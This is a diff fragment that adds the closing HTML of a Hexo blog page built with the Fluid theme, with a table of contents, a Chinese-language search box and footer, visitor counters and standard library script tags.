+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+  <div class="col-lg-7 mx-auto nopadding-x-md">
+    <div class="container custom post-custom mx-auto">
+      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
+    </div>
+  </div>
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
